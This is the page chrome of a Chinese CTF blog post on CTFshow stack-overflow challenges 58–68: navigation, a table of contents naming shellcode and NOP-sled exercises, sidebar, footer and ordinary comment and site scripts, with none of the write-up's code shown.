data-background-image="https:&#x2F;&#x2F;ooo.0x0.ooo&#x2F;2023&#x2F;03&#x2F;09&#x2F;Y0hOs.jpg" title="cmcc_simplerop（mprotect）"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>BUUCTF</span><h3>cmcc_simplerop（mprotect）</h3></a></div><div class="item right"><a href="/2023/10/21/pwn/%E7%BB%86%E8%8A%82/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;ooo.0x0.ooo&#x2F;2023&#x2F;03&#x2F;09&#x2F;Y0iNK.jpg" title="pwn忽略的细节"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>CTF</span><h3>pwn忽略的细节</h3></a></div></div><div class="wrap" id="wcomments"></div><script type="module" data-pjax="data-pjax">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

setTimeout(function () {
    init({
        el: '#wcomments',
        serverURL: 'https://vvwwvv.zeabur.app',
        lang: 'zh-CN',
        locale: {},
        emoji: ["https://unpkg.com/@waline/emojis@1.0.1/weibo","https://unpkg.com/@waline/emojis@1.0.1/alus","https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/tieba","https://unpkg.com/@waline/emojis@1.0.1/tw-emoji"],
        meta: ["nick","mail","link"],
        requiredMeta: ["nick","mail"],
        wordLimit: 0,
        pageSize: 10,
        pageview: true,
        path: window.location.pathname,
        dark: 'html[data-theme="dark"]'
    });
}, 1000)</script></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E6%89%80%E6%94%B6%E8%8E%B7%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text"> 有所收获的题目：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn58shellcode"><span class="toc-number">2.</span> <span class="toc-text"> pwn58(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">2.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn59shellcode"><span class="toc-number">3.</span> <span class="toc-text"> pwn59(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn60shellcode"><span class="toc-number">4.</span> <span class="toc-text"> pwn60(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-3"><span class="toc-number">4.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn61shellcode"><span class="toc-number">5.</span> <span class="toc-text"> pwn61(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-4"><span class="toc-number">5.1.</span> <span class="toc-text"> 题目：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn62shellcode"><span class="toc-number">6.</span> <span class="toc-text"> pwn62(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-5"><span class="toc-number">6.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn63shellcode"><span class="toc-number">7.</span> <span class="toc-text"> pwn63(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-6"><span class="toc-number">7.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn64shellcode"><span class="toc-number">8.</span> <span class="toc-text"> pwn64(shellcode)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-7"><span class="toc-number">8.1.</span> <span class="toc-text"> 题目：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn65%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%98%BE%E7%A4%BA%E7%9A%84shellcode%E5%8F%8A%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text"> pwn65（字符串显示的 shellcode 及汇编分析）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-8"><span class="toc-number">9.1.</span> <span class="toc-text"> 题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn66-shellcode%E5%BC%80%E5%A4%B4%E4%B8%BAx00"><span class="toc-number">10.</span> <span class="toc-text"> pwn66 (shellcode 开头为 \x00 )</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-9"><span class="toc-number">10.1.</span> <span class="toc-text"> 题目：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn67-nop-sled-shellcode"><span class="toc-number">11.</span> <span class="toc-text"> pwn67 （nop sled  -&gt;shellcode）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E9%A2%98%E7%9B%AE"><span class="toc-number">11.1.</span> <span class="toc-text"> 1. 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">11.2.</span> <span class="toc-text"> 2. 漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn6864%E4%BD%8Dsled-shellcode"><span class="toc-number">12.</span> <span class="toc-text"> pwn68（64 位 sled -&gt;shellcode）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">12.1.</span> <span class="toc-text"> 题目描述：</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow35-46/" rel="bookmark" title="CTFshow(栈溢出部分,35~46)">CTFshow(栈溢出部分,35~46)</a></li><li ><a href="/2023/10/14/pwn/%E5%88%B7%E9%A2%98/ctfshow/47-57/" rel="bookmark" title="CTFshow(栈溢出部分,47~57)">CTFshow(栈溢出部分,47~57)</a></li><li  class="active"><a href="/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/" rel="bookmark" title="CTFshow(栈溢出部分,58~68)">CTFshow(栈溢出部分,58~68)</a></li><li ><a href="/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow69-79/" rel="bookmark" title="CTFshow(栈溢出部分,69~80)">CTFshow(栈溢出部分,69~80)</a></li><li ><a href="/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/pwn80-90/" rel="bookmark" title="CTFshow(栈溢出部分,81~90 重点ret2_dl_resolve)">CTFshow(栈溢出部分,81~90 重点ret2_dl_resolve)</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="vvwwv" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">vvwwv</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">86</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">61</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">22</span><span class="name">标签</span></a></div></nav><div class="social"><a href="https://github.com/cyb141520" class="item github" rel="noopener" title="https:&#x2F;&#x2F;github.com&#x2F;cyb141520" target="_blank"><i class="ic i-github"></i></a><a href="/1415206596@qq.com" class="item email" title="1415206596@qq.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/10/21/pwn/%E7%BB%86%E8%8A%82/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/10/20/pwn/%E5%88%B7%E9%A2%98/BUUCTF/cmcc_simplerop/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于Linux">Linux</a></div><span><a href="/2023/10/16/Linux/linux/Linux%E8%80%83%E6%A0%B8%E5%91%BD%E4%BB%A4%E4%B8%8Eshell/">Linux命令与shell脚本（Linux课程考核）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a></div><span><a href="/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/">Linux之系统调用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/CTFshow/" title="分类于CTFshow">CTFshow</a><i class="ic i-angle-right"></i><a href="/categories/CTF/CTFshow/%E5%A0%86%E5%88%A9%E7%94%A8/" title="分类于堆利用">堆利用</a></div><span><a href="/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow135-145/">CTFshow(堆利用-前置基础,135~)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="分类于栈溢出">栈溢出</a></div><span><a href="/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_buffer_overflow/">PicoCTF_2018_buffer_overflow（栈溢出）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a></div><span><a href="/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/">C语言函数（及漏洞利用）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/DynELF/" title="分类于DynELF">DynELF</a></div><span><a href="/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/">DynELF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a></div><span><a href="/2023/10/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/%E6%96%B0%E6%96%87%E6%A1%A3/">wustctf2020_closed（栈溢出）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a></div><span><a href="/2023/09/28/pwn/%E4%B8%93%E6%A0%8F/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows/" title="分类于Windows">Windows</a><i class="ic i-angle-right"></i><a href="/categories/Windows/msf%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/" title="分类于msf渗透攻击">msf渗透攻击</a></div><span><a href="/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Windows7永恒之蓝漏洞复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/ret2dlresolve/" title="分类于ret2dlresolve">ret2dlresolve</a></div><span><a href="/2023/10/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/xdctf2015_pwn200(ret2dlresolve)/">xdctf2015_pwn200（栈溢出,ret2dlresolve）</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"><li class="item" v-for="com in coms"><a v-bind:href="root + com.href" data-pjax-state="data-pjax-state"><span class="breadcrumb">{{com.nick}} @ {{com.time}}</span><span>{{com.text}}<br/></span></a></li></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">vvwwv @ vvwwv'Blog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">680k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">10:18</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
        path: `2023/10/21/pwn/刷题/ctfshow/58-68/`,
        favicon: {
        show: `不负韶华`,
        hide: `以梦为马！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,
    chart: false,
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://polyfill.io/v3/polyfill.min.js?features=default,fetch"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.0.2/pace.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/algoliasearch/4.12.1/algoliasearch-lite.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/instantsearch.js/4.39.0/instantsearch.production.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/quicklink/2.2.0/quicklink.umd.min.js"></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/??jquery/3.5.1/jquery.min.js,fancybox/3.5.7/jquery.fancybox.min.js,justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" async></script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/KaTeX/0.15.2/contrib/copy-tex.min.js" async></script><script src="/js/app.js?v=0.3.5"></script>
    <script type="module" data-pjax>
        let items = []
        import { RecentComments } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs'
        RecentComments({
          serverURL: 'https://vvwwvv.zeabur.app',
          count: 10,
        }).then(({ comments }) => {
          comments.forEach(function (item) {
              let cText = (item.orig.length > 50) ? item.orig.substring(0,50)+'...' : item.orig
              item.url = item.url !== '/' ?  '/' + item.url : item.url;
              const siteLink = item.url + "#" + item.objectId
              items.push({
                  href: siteLink,
                  nick: item.nick,
                  time: item.insertedAt.split('T').shift(),
                  text: cText
              })
          })
          Vue.createApp({
            data() {
                return {
                    coms: items,
                    root: ''
                }
            }
          }).mount('#new-comment')
        }).catch(function (err) {
          console.error(err)
        })
    </script>
    </body></html>